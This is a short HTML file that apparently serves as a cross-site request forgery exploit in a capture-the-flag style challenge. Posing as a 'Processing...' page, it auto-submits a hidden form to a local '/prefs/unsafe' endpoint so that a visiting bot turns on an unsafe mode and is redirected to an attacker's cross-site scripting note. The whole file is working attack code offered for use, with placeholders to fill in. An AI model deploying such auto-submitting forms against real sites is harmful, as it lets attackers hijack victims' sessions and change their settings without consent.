<!-- filepath: csrf.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Processing...</title>
</head>
<body>
    <p>Please wait while we process your request...</p>
    <!-- This form targets the bot's internal view of the application -->
    <form id="csrfForm" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
        <!-- ATTACKER_NOTE_ID_PLACEHOLDER should be replaced with the ID of YOUR note -->
        <input type="hidden" name="id" value="1" />
        <input type="hidden" name="enable" value="1" /> <!-- Value '1' enables unsafe mode -->
    </form>
    <script>
        // Replace ATTACKER_NOTE_ID_PLACEHOLDER with the actual ID of your XSS note from Step 1.
        const attackerNoteId = "1"; // <-- REPLACE THIS WITH YOUR ATTACKER_NOTE_ID

        document.querySelector('#csrfForm input[name="id"]').value = attackerNoteId;
        
        // Automatically submit the form.
        // When the bot visits this page, this form will be submitted in its context.
        // The /prefs/unsafe route will then redirect the bot to /notes/ATTACKER_NOTE_ID
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
